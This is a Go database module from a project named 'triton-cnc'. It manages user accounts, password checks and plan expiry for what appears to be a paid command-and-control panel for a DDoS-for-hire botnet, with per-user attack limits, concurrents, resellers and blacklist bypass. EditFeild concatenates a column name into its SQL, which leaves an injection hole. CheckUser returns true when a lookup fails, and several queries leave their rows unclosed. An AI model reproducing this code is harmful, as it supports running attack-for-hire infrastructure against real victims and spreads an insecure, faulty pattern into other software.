package database

import (
	"database/sql"
	"errors"
	"log"
	"time"

	"triton-cnc/core/models/util"
)


type User struct {
	ID					int
	Username 			string
	Password			string
	NewAccount			bool
	Administrator   	bool
	Reseller 			bool
	Vip					bool
	Banned				bool

	Maxtime				int
	Cooldown			int
	Concurrents			int

	MaxSessions			int
	PowerSavingExempt 	bool
	BypassBlacklist		bool

	PlanExpiry			int64
}


func CheckUser(user string) bool {
	row, error := Database.Query("SELECT * FROM `users` WHERE `username` = ?", user)
	if error != nil {
		return true
	}

	if !row.Next() {
		return true
	}

	return false
}

func CreateUser(User *User) error {
	Row, error := Database.Query("INSERT INTO `users` VALUES (NULL,?,?,?,?,?,?,?,?,?,?,?,?,?,?);", User.Username, util.HashPassword(User.Password), User.NewAccount, User.Administrator, User.Reseller, User.Banned, User.Vip, User.Maxtime, User.Cooldown, User.Concurrents, User.MaxSessions, User.PowerSavingExempt, User.BypassBlacklist, User.PlanExpiry)
	if error != nil {
		return error
	}

	if Row.Err() != nil {
		return Row.Err()
	}

	return nil
}

func AddTime(user string, TimeUnit time.Duration) bool {
	User, error := GetUser(user)
	if error != nil {
		return false
	}

	Plan_time := time.Unix(User.PlanExpiry, 0)

	Time_Asending := Plan_time.Add(TimeUnit).Unix()

	Row, error := Database.Query("UPDATE `users` SET `PlanExpiry` = ? WHERE `username` = ?", Time_Asending, user)
	if error != nil || Row.Err() != nil {
		return false
	}

	return true
}

func RemoveUser(user string) bool {
	Database.QueryRow("DELETE FROM `users` WHERE `username` = ?", user)

	return true
}

func User_Auth(username, password string) (bool, error) {
	Row, error := Database.Query("SELECT * FROM `users` WHERE `username` = ? AND `password` = ?", username, util.HashPassword(password))
	if error != nil {
		return false, error
	}

	if !Row.Next() {
		return false, nil
	}

	return true, nil
}


func GetUser(user string) (*User, error) {

	Row, error := Database.Query("SELECT * FROM `users` WHERE `username` = ?", user)
	if error != nil {
		return nil, error
	}

	if !Row.Next() {
		return nil, errors.New("failed")
	}

	var Users User
	error = Database.QueryRow("SELECT `ID`, `Username`, `NewUser`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry` FROM `users` WHERE `username` = ?", user).Scan(&Users.ID, &Users.Username, &Users.NewAccount, &Users.Administrator, &Users.Reseller, &Users.Banned, &Users.Vip, &Users.Maxtime, &Users.Cooldown, &Users.Concurrents, &Users.MaxSessions, &Users.PowerSavingExempt, &Users.BypassBlacklist, &Users.PlanExpiry); if error != nil {
		return nil, error
	}

	return &Users, nil
}

func EditFeild(user, feild, replace string) bool {
	Row ,error := Database.Query("update `users` set "+feild+" = ? where username = ?", replace, user); if error != nil || Row.Err() != nil {
		log.Println(error)
		return false
	}

	return true
}

func GetUsers() ([]*User, error) {

	var users []*User
	rows, err := Database.Query("SELECT `ID`, `Username`, `NewUser`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry` FROM `users`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}

		return users, err
	}

	defer rows.Close()

	for rows.Next() {
		user := &User{}
		if err := scanUsers(rows, user); err != nil {
			continue
		}

		users = append(users, user)
	}

	return users, nil
}

func scanUsers(row *sql.Rows, Users *User) error {

	return row.Scan(
		&Users.ID,
		&Users.Username,
		&Users.NewAccount,
		&Users.Administrator,
		&Users.Reseller,
		&Users.Banned,
		&Users.Vip,
		&Users.Maxtime,
		&Users.Cooldown,
		&Users.Concurrents,
		&Users.MaxSessions,
		&Users.PowerSavingExempt,
		&Users.BypassBlacklist,
		&Users.PlanExpiry,
	)
}

